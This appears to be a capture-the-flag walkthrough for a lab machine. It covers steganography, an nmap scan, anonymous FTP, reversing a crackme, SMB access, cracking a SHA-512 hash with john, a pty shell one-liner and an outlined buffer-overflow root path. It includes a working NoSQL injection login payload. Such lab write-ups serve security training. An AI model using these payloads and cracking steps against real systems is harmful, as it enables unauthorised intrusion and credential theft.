# Walkthrough

### flag1 [stegnography]

1. strings abacusqn1.jpg | less
   interesting output printable texts

    [ A fine day , hwhlvr{phrdajprxg} ]

    - A fine day , it means affine cipher

    By using some online crackers for affine cipher
    Eg: https://www.boxentriq.com/code-breaking/affine-cipher

    The flag is abacus{easydoesit}

#### Port Scanning nmap results

```bash
nmap -sC -sV -oA nmap/ 10.10.107.164

Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-23 15:15 IST
Nmap scan report for 10.10.107.164
Host is up (0.37s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxr-xr-x    1 ftp      ftp         14472 Apr 22 15:05 crackme
|_-rw-r--r--    1 ftp      ftp          1012 Apr 22 15:05 message.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.36.149
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
5000/tcp open  http        Node.js Express framework
| http-robots.txt: 1 disallowed entry
|_/abacus{s1mpu-th3-p1mpu} /needle
|_http-title: Employee Site
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: VAGRANT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-04-23T09:46:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.88 seconds


```

### flag2 [robots.txt]

1. As port 5000 is running a webserver
   in http://10.10.107.164:5000/robots.txt

    abacus{s1mpu-th3-p1mpu}

### flag3 and flag4 [ftp]

    [Automation Script All](https://github.com/blessingcharles/AbacusCTF/tree/main/utilities)

1. port21 anonymous login enabled

    ```bash
        get crackme
        get message.txt
    ```

    - For exploiting the given two binaries you can find the automation scripts in
      [Automation Script FTP](https://github.com/blessingcharles/AbacusCTF/tree/main/utilities/ftp)

##### message.txt

    Important hints from mr.th3h04x
    ```text
        1. printed text of "ch3c00h sheizsjddcqpnodv"
        2. 5c86511993d156bb079996d6abbe5aa83698602d321e37c49324915074002ae7a1af
        7c2909f1d840ad47bdb3b8cacd419f6b3ba889c58725c1d14e93453ed473
        3.  4 drinks
    ```

    ch3cooh means acetic acid which signifies vinegar which means the given text is
    vigenere cipher sheizsjddcqpnodv . 4 drinks signified the key used for the cipher
    text length is 4.

        Reverse engineer the algo:
            We need to permute a 4 len key and use vigenere algorith with the cipher
        text , untill it matched the sha512 hash given by the printer administrator

        Flag : thomasthecatoonz

##### crackme

    ```bash
        file crackme
        crackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /
        lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f54f0900763a3113ac2c837e2bcd6f5ce9e78bd3, for GNU/Linux 3.2.0, stripped
    ```

    - Its an stripped elf64 binary so if we reverse engineer it with gdb , r2 or ghidra etc.
    - The binary is expecting a password in cmdline arguments

    ```bash
        r2 crackme
        s main
        s fcn.000011fe
    ```
    By reversing the algo the two main things we found
    ```python
        hasher = [0x43, 0x12, 0x13, 0x21, 0x64, 0x42,
                0x13, 0x52, 0x15, 0x32, 0x19, 0x13,
                0x23, 0x61, 0x14, 0x51, 0x28, 0x12,
                0x13, 0x32, 0x12, 0x42]

        hash_passwd = [0x22, 0x70, 0x72, 0x42, 0x11, 0x31,
                        0x68, 0x34, 0x67, 0x3, 0x2a, 0x7d,
                        0x47, 0x54, 0x72, 0x61, 0x5a, 0x21,
                        0x65, 0x1, 0x60, 0x3f]
    ```
    flag: [+] Cracked :  abacus{fr13nd5f0r3v3r}

### flag 5 and 6 [smb]

The previous flags are used as username and password for smbclient

```bash
    smbclient //10.10.107.164/thomasthecatoonz -U thomasthecatoonz
    Enter WORKGROUP\thomasthecatoonz's password:
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Fri Apr 22 19:56:04 2022
      ..                                  D        0  Fri Apr 22 19:56:04 2022
      chutney                             N      880  Sat Apr 23 08:50:41 2022
      message.txt                         N      966  Sat Apr 23 08:50:41 2022
      secretchat                          N    21948  Sat Apr 23 08:50:42 2022
```

##### flag5 : chutney

    - As mentioned in the message.txt chutney it means pickled object of python
    so by doing reverse engineering the file we can get the flag

    Automation script in github
    abacus{1p4v#dr45ht1}  ---- Employee secret

##### flag6 : secretchat

    - In the chats we can see thomas and jerry talks about jwt secret
    - jerry shares his jwt secret in sha512 after cracking we found that armageddon391

    ```sha512
        Jerry: 60aa4d765ead6dcf8248681c5a444502fa23f9c26fd8885d7ae2571ee67558c6e6b1b33c2c6450d443baeadb3413058c5eeeb67d87f88da9584afa6c4a130586
    ```

    ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt myhash --format=raw-sha512
    ```

### flag 7 and 8 [Webserver]:

##### flag 7[No sql injection]

    ```json
        {"email":{
            "$gt":""
        },"password":{
            "$gt":""
        },"employeeSecret":"1p4v#dr45ht1"}
    ```
    url : http://10.10.28.23:5000/login
    In localstorage we can get the flag and token
    abacus{user_31k4n1h4n125td}

##### flag 8[jwt bypass]

    - with the ssh username and password we can login as user
    - for stabilizing the shell
    ```bash
        python3 -c 'import pty;pty.spawn("/bin/bash")'
    ```

#### user.txt

```bash
    cat .user.txt
```

#### root.txt

    - A service is running as port 8036 running as root so we can exploit it and get root
    - Vulnerability buffer overflow
    - We need to bruteforce the stack canary , rbp , rip to bypass aslr , pie mitigations
    - We need to use ROPgadgets to get root shell

```bash
    cat .root.txt
```
